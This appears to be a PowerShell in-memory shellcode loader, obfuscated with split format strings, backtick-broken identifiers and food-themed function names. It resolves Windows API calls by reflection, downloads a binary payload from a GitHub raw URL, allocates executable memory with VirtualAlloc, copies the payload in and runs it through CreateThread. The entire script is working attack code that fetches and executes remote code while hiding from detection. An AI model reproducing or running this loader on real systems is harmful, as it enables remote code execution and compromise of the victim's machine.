$testMe  =  [TYPE]("{0}{2}{1}" -f 'APP','MaiN','dO'); function tasty {
Param (${ChER`R`IES}, ${P`In`EAPpLE})
${TO`MaTO`es} = ( $TestMe::"CUr`Re`NTdOm`AiN".("{3}{0}{2}{1}" -f'e','mblies','tAsse','G').Invoke() | .("{0}{1}{2}" -f 'Whe','r','e-Object') { ${_}."Glo`BALAssEMb`l`ycaC`HE" -And ${_}."LO`Ca`TiON".("{0}{1}" -f'Spl','it').Invoke('\\')[-1].("{0}{1}"-f'E','quals').Invoke(("{2}{0}{1}" -f'ystem','.dll','S')) }).("{0}{1}" -f'Ge','tType').Invoke(("{6}{4}{0}{3}{7}{1}{2}{5}{8}{9}"-f'oso','s','afeNati','ft','icr','ve','M','.Win32.Un','Met','hods'))
${TuRn`I`pS}=@()
${tom`A`TOEs}.("{0}{2}{1}{3}" -f'Ge','tho','tMe','ds').Invoke() | .("{2}{3}{1}{0}" -f'ject','b','Fo','rEach-O') {If(${_}."n`AME" -eq ("{0}{1}{3}{2}" -f'GetPr','oc','ess','Addr')) {${T`Urn`iPS}+=${_}}}
return ${tU`Rni`PS}[0]."I`NV`OkE"(${nu`Ll}, @((${To`mat`oEs}.("{2}{0}{1}" -f 'tMeth','od','Ge').Invoke(("{0}{1}{2}{3}"-f 'G','etModuleHand','l','e')))."iNVo`kE"(${N`UlL}, @(${chE`RR`ies})), ${Pi`NEaPP`LE}))
}

function pears {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)
$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
return $type.CreateType()
}

$payload = "https://github.com/SV-ZeroOne/Public_Code/raw/refs/heads/master/mctest02.bin"
[Byte[]] $buf = [System.Net.WebClient]::new().DownloadData($payload)

$tomatos = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tasty kernel32.dll VirtualAlloc), (pears @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)


[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $tomatos, $buf.length)
$parsnips =
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tasty kernel32.dll CreateThread), (pears @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$tomatos,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tasty kernel32.dll WaitForSingleObject), (pears @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)